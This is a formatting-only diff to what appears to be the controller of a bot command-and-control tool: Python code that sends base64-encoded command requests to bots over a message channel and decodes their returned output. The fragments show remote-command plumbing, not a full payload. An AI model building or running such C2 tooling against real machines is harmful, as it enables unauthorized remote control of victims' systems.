@@ -53,7 +53,11 @@ class Controller:
             bot = self.bots.get(bot_id)
 
             if bot and bot["commands"] and bot["commands"][command_id]:
-                stdout = base64.b64decode(response.body[response.body.find("(") + 1: response.body.find(")")].encode('utf-8')).decode('utf-8')
+                stdout = base64.b64decode(
+                    response.body[
+                        response.body.find("(") + 1 : response.body.find(")")
+                    ].encode("utf-8")
+                ).decode("utf-8")
                 print(f"\n{stdout}")
                 self.channel.delete_message(command_id)
 
@@ -114,7 +118,7 @@ class Controller:
 
         bot = self.bots.get(bot_id)
 
-        bot_id = base64.b64encode(bot_id.encode('utf-8')).decode('utf-8')
+        bot_id = base64.b64encode(bot_id.encode("utf-8")).decode("utf-8")
 
         if not bot or bot["last_ping"] != self.last_ping:
             print("Specified bot is offline!")
@@ -122,10 +126,7 @@ class Controller:
             self.bots_lock.release()
             return
 
-        command = self.channel.send_message(
-            f"{Channel.W_REQUEST} "
-            f"()[{bot_id}]"
-        )
+        command = self.channel.send_message(f"{Channel.W_REQUEST} ()[{bot_id}]")
 
         if not bot.get("commands"):
             bot["commands"] = {}
